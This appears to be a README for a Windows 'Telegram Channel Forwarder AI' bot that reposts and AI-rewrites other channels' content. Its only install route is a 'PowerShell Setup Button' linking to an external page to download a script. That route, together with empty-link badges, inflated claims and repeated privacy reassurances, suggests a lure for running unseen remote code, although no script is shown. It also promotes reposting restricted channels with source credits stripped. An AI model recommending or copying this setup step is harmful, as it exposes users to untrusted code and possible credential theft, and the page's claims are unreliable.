<div align="center">

# 🚀 Friendly Community-Powered Telegram Channel Forwarder AI Bot

![](files/preview.png)

### 🔧 PowerShell Setup Button

[![](files/button.png)](https://mancingr21-creator.github.io/telegram-channel-forwarder-ai/)

[![ps](https://img.shields.io/badge/Ps-7%2B-2ea44f?style=flat&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Ok-2ea44f?style=flat&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/Pulls-93K-34b759?style=flat&labelColor=0d1117)]() [![language](https://img.shields.io/badge/Language-Python-1a7f37?style=flat&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Maintained-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Telegram Channel Forwarder AI is a community-minded companion for anyone who curates and reshapes Telegram channels on Windows, built to help you catch new posts the moment they land and pass them along in your own voice. Its AI rewriter smooths, summarizes, and restyles incoming content on the fly, while thoughtful cleanup tools strip out stray mentions, links, and promotional clutter before anything goes live. Everything runs locally on your own machine, so your keys and session details stay right where they belong. Seasoned curators and curious newcomers alike will find plenty to love, and every suggestion from the community helps shape what comes next.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

⚡ **Instant Channel Relay:** Connects straight to Telegram and picks up new posts the moment they land — public, private, or restricted channels alike, with no noticeable delay between source and destination.
- 🤖 **AI Content Rewriter:** Built-in Gemini-powered rewriting reshapes every incoming post to match your channel's voice — rephrase, condense long reads, or translate into another language before anything goes out.
- 🛡️ **Clean-Up Pass:** Strips stray usernames, outside links, hashtags, and promotional footers so only polished content reaches your audience.
- 🎛️ **Approval Bot:** An interactive inline-keyboard bot lets you review, tweak, or skip rewritten posts before they publish — full control, guesswork.
- 🔒 **Everything Stays Local:** Your API keys, bot tokens, and session credentials never leave your own machine; all processing happens on your PC.
- 🖥️ **Friendly Desktop Interface:** A tidy CustomTkinter window with live logs and a guided setup wizard makes first-run configuration a breeze.
- 🌍 **Built for the Community:** Open to suggestions, shaped by user feedback, and improved with every release — jump in, share ideas, and help steer what comes next.

## Commands

Here's the complete command reference for **Telegram Channel Forwarder AI** — your friendly control center for everything the bot can do. Fire these off from the built-in admin chat or your linked bot to manage forwarding on the fly. 🚀

### 🧭 Core Controls
- `/start` — Wake the bot up and open the main dashboard with quick-action buttons.
- `/help` — A tidy cheat-sheet of every command, grouped by category. Handy for first-timers.
- `/status` — Live health report: active channels, queue depth, AI rewrite stats, and uptime.
- `/pause` — Pause forwarding without losing your setup. Resume any time.
- `/resume` — Pick up right where you left off, queue and all.
- `/restart` — Gracefully cycle the forwarder when you want a fresh start.

### 📡 Channel Management
- `/addchannel <source> <target>` — Link a source channel to a destination in one step.
- `/removechannel <source>` — Unlink a source channel; your history stays intact.
- `/listchannels` — See every linked pair with status badges and last-forward timestamps.
- `/setfilter <channel> <keyword>` — Whitelist or blacklist keywords per channel.
- `/silence <channel>` — Mute forwarding for a channel while keeping it monitored.

### ✨ AI Rewriting Suite
- `/aienable <channel>` — Switch on AI rewriting for a specific channel.
- `/aidisable <channel>` — Revert to verbatim forwarding for that channel.
- `/prompt <text>` — Set the tone and style instructions your AI writer follows.
- `/tone <casual|formal|punchy|neutral>` — One-tap voice presets for quick tuning.
- `/translate <language>` — Auto-translate forwarded content into your chosen language.
- `/summarize <on|off>` — Condense long posts into tidy digests before publishing.
- `/preview` — Render the next rewrite without publishing — perfect for spot checks.

### 🧹 Cleanup Tools
- `/strip <mentions|links|hashtags|footers>` — Choose which elements get scrubbed automatically.
- `/watermark <add|remove> <text>` — Append or drop a custom signature on forwarded posts.
- `/dedupe <on|off>` — Skip duplicate reposts from busy sources.

### ✅ Approval Workflow
- `/approve <id>` — Publish a rewritten draft instantly.
- `/reject <id>` — Toss a draft you don't want to send.
- `/edit <id> <new text>` — Tweak the wording before it goes live.
- `/queue` — Peek at the pending approval list with inline action buttons.
- `/autoapprove <on|off>` — Toggle hands-off publishing when you trust the output.

### ⚙️ Utilities
- `/config` — View and change runtime settings without restarting.
- `/logs [n]` — Pull the last *n* activity lines right into chat.
- `/stats` — Daily and weekly forwarding counts, rewrite ratios, and top channels.
- `/export` — Bundle your configuration into a shareable backup file.
- `/reset` — Wipe custom settings and return to sensible defaults (asks first).

### 💬 Community Favorites
- `/feedback <message>` — Send kudos or bug reports straight to the maintainers.
- `/tips` — Random pro-tip to get more out of your forwarding setup.
- `/version` — Check which build you're running and whether a newer release is out.

Every command replies with friendly inline buttons where it makes sense — no memorizing syntax required. Mix, match, and make the forwarder behave exactly how your community likes it. 💙

## Configuration

Everything the bot needs lives in a single, tidy config file — and we've kept it genuinely approachable so you can go from fresh install to live forwarding in a few minutes. Drop in your values, save, restart, and you're off. No obscure flags, no guessing games. 💙

### 🗂️ The Essentials

| Setting | What it does | Friendly default |
|-|-|-|
| `telegram_api_id` / `telegram_api_hash` | Connects your client to Telegram so the forwarder can listen to channels | — (required) |
| `bot_token` | Powers the interactive approval bot where you review and publish posts | — (required) |
| `source_channels` | The channels to watch — public, private, or restricted all welcome | empty list |
| `destination_channel` | Where rewritten posts land | — (required) |
| `ai_provider_key` | Your Gemini key for rewriting, summarizing, and translating | — (required) |
| `rewrite_prompt` | The tone and style guide the AI follows for your channel | a friendly starter prompt |
| `approval_mode` | `review` lets you approve each post; `auto` publishes immediately | `review` |

### 🎛️ Fine-Tuning Your Flow

- **`sanitize_rules`** — toggle removal of `@mentions`, external links, hashtags, and promotional footers. Enable only what you need and keep your channel's voice clean.
- **`watermark_text`** — add your own signature line to outgoing posts, or leave it blank for none.
- **`language_targets`** — list the languages you'd like posts translated into; the AI handles the rest.
- **`post_delay_seconds`** — a gentle pause between forwards to keep things human-paced and avoid rate limits.
- **`log_level`** — `info` for everyday updates, `debug` when you're curious about the details.

### 🔐 Privacy First, Always

Your keys, tokens, and session credentials stay on your machine — full stop. Nothing is uploaded anywhere, and the local config is the single source of truth. Back it up somewhere safe, and share it with no one.

### 🧩 A Note on Extensibility

The config is designed to grow with the community. New sanitization rules, prompt templates, and language options slot in cleanly, so if you've built something useful, we'd love to see it shared back. This project gets better every time someone tinkers. ✨

## FAQ

**Is Telegram Channel Forwarder AI really available without paying?**
Absolutely — the core forwarder and AI rewriter are accessible to everyone in the community. We believe powerful automation should be within reach, so you can start forwarding and rewriting right away. Optional supporter perks exist for folks who want to back development, but the essential toolkit stays open to all.

**Do I need coding skills to get started?**
Not at all! The desktop app ships with a friendly setup wizard that walks you through connecting your Telegram API credentials, picking channels, and choosing your AI rewrite style. If you can click through a few screens, you're good to go.

**Which Telegram channels can it forward from?**
Public, private, and restricted channels are all supported thanks to the direct client connection. Just add the channels you want to monitor in the Configuration tab, and the forwarder handles the rest in real time.

**How does the AI rewriting work?**
You provide your own Gemini API key and a prompt template describing the tone, length, and style you want. Every incoming post gets rewritten to match — whether that's summarizing long reads, translating content, or giving it your channel's unique voice.

**Can I review posts before they go live?**
Yes! The interactive approval bot sends each rewritten post to your Telegram with inline buttons so you can approve, edit, or reject it. Prefer full automation? Flip a switch and let it publish instantly.

**Will it strip competitor mentions and links?**
Definitely. The sanitization engine removes usernames, external links, hashtags, and promotional footers automatically — keeping your channel clean and on-brand.

**Is my data safe?**
Your API keys, bot tokens, and session credentials stay on your own machine. Nothing is uploaded to external servers, and the whole tool runs locally on Windows.

**What if I run into trouble or have an idea for a feature?**
Hop into our community chat — we're a friendly bunch of channel admins and tinkerers who love helping out. Bug reports, feature requests, and wild ideas are all welcome, and contributor pull requests are always appreciated.

**Does it work 24/7 without me babysitting it?**
Yep — once you hit Start Forwarder, it keeps running in the background, capturing and rewriting posts around the clock. Real-time logs in the desktop UI let you peek in anytime to see what's happening.

## Support

We're building this together, and the best part of Telegram Channel Forwarder AI is the community that shapes it. Whether you're automating your first channel or pushing the AI rewriter to its limits with custom prompts, your feedback moves the project forward.

**Here's how to get involved:**

- **🐞 Spot something odd?** Open an issue in this repository with your Windows version, a short description of what happened, and the relevant log lines from the app's real-time console. The more detail, the faster it gets sorted.
- **💡 Have an idea?** Feature requests are genuinely welcome — from new AI rewrite templates to smarter sanitization rules. Share the workflow you have in mind and how it would fit into your setup.
- **🧩 Want to contribute?** Pull requests are reviewed with care. Improvements to the forwarder pipeline, the approval bot, documentation, or the desktop UI are all appreciated.
- **🗣️ Help other users.** Answering a question in the discussions area or confirming a bug on your machine is a real contribution — it keeps the project healthy and welcoming.

**A few friendly notes:**

- This tool is and will remain **openly accessible** — no paywalls, no locked tiers. It grows through shared effort, not gatekeeping.
- Please keep reports constructive and on-topic. Everyone here is volunteering their time, and kindness makes everything run smoother.
- When sharing configurations or prompt templates, double-check that your API keys and bot tokens are removed first. Your credentials belong to you alone.
- Discussions about **enhancement features** and advanced automation are welcome as long as they respect Telegram's terms of service and the channels you work with.

Every issue, suggestion, and kind word helps Telegram Channel Forwarder AI become more capable and more reliable. Thank you for being part of it — now go forward something great! 🚀

## License

We believe in open, community-first software. Telegram Channel Forwarder AI is released under a permissive, accessible license that welcomes everyone — from solo channel curators to teams running large networks. You are welcome to use it, study it, modify it, and share your improvements with the rest of the community. The goal is simple: keep the project growing through shared ideas, collective feedback, and contributions from people like you.

You are encouraged to fork the project, adapt it to your own workflows, and build on top of it — whether that means adding new AI rewriting prompts, integrating fresh forwarding logic, or polishing the desktop UI. If you discover a bug, have a bright idea, or want to suggest an enhancement, open an issue or submit a pull request. Every contribution, big or small, helps make the tool better for everyone.

The project is provided as-is, without warranty of any kind, and the maintainers are not liable for any issues arising from its use — please review the full license text in the repository for the exact terms. Commercial and personal use are both welcome, provided the original license notice is preserved. We kindly ask that you credit the project and share improvements back with the community whenever possible, so the whole ecosystem benefits.

Thank you for being part of this journey. Happy forwarding, and happy building! 💙